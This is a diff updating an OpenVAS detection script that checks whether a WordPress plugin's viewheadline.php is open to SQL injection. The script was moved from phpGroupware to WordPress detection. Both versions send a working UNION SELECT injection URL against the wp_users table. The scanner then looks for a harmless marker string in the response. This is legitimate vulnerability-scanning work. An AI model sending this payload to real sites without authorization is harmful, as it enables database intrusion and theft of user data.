@@ -1,8 +1,8 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_viewheadline.php_sql_inj_01_15.nasl 5819 2017-03-31 10:57:23Z cfi $
+# $Id: gb_viewheadline.php_sql_inj_01_15.nasl 6713 2017-07-13 09:08:03Z cfischer $
 #
-# viewheadline.php SQL Injection Vulnerability
+# 'viewheadline.php' WP-Plugin SQL Injection Vulnerability
 #
 # Authors:
 # Michael Meyer <michael.meyer@greenbone.net>
@@ -25,62 +25,53 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+CPE = "cpe:/a:wordpress:wordpress";
+
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.105186");
- script_version ("$Revision: 5819 $");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.105186");
+  script_version("$Revision: 6713 $");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("'viewheadline.php' WP-Plugin SQL Injection Vulnerability");
+  script_tag(name:"last_modification", value:"$Date: 2017-07-13 11:08:03 +0200 (Thu, 13 Jul 2017) $");
+  script_tag(name:"creation_date", value:"2015-01-26 11:22:03 +0100 (Mon, 26 Jan 2015)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
+  script_dependencies("secpod_wordpress_detect_900182.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("wordpress/installed");
 
- script_name("viewheadline.php SQL Injection Vulnerability");
+  script_xref(name:"URL", value:"http://zeroday.insecurity.zone/exploits/headlines_sqli.txt");
 
- script_tag(name: "impact" , value:"Exploiting this issue could allow an attacker to compromise the
-application, access or modify data, or exploit latent vulnerabilities in the underlying database.");
+  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
+  application, access or modify data, or exploit latent vulnerabilities in the underlying database.");
 
- script_tag(name: "vuldetect" , value:"Send a special crafted HTTP GET request and check the response");
+  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");
 
- script_tag(name: "summary" , value:"viewheadline.php is prone to an SQL-injection vulnerability because it
-fails to sufficiently sanitize user-supplied data before using it in an SQL query.");
+  script_tag(name:"summary", value:"viewheadline.php is prone to an SQL-injection vulnerability because it
+  fails to sufficiently sanitize user-supplied data before using it in an SQL query.");
 
- script_tag(name:"last_modification", value:"$Date: 2017-03-31 12:57:23 +0200 (Fri, 31 Mar 2017) $");
- script_tag(name:"creation_date", value:"2015-01-26 11:22:03 +0100 (Mon, 26 Jan 2015)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
- script_dependencies("phpgroupware_detect.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
+  script_tag(name:"qod_type", value:"remote_app");
 
- script_tag(name:"qod_type", value:"remote_app");
-
- exit(0);
+  exit(0);
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
 
-port = get_http_port( default:80 );
-if( ! can_host_php( port:port ) ) exit( 0 );
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
-dirs = make_list_unique( cgi_dirs( port:port ), "/about", "/foundation" );
+if( dir == "/" ) dir = "";
+url = dir + "/viewheadline.php?id=-9%27%20union%20select%201,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20wp_users--+";
 
-if( dir = get_app_location( cpe:"cpe:/a:phpgroupware:phpgroupware", port:port ) )  dirs = make_list_unique( dir, dirs );
-
-foreach dir ( dirs )
-{
-
-  if( dir == "/" ) dir = "";
-
-  url = dir + "/viewheadline.php?id=-9%27%20union%20select%201,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20wp_users--+";
-
-  if( http_vuln_check( port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test" ) )
-  {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit(0);
-  }
+if( http_vuln_check( port:port, url:url, pattern:"OpenVAS-SQL-Injection-Test" ) ) {
+  report = report_vuln_url( port:port, url:url );
+  security_message( port:port, data:report );
+  exit( 0 );
 }
 
-exit(99);
+exit( 99 );
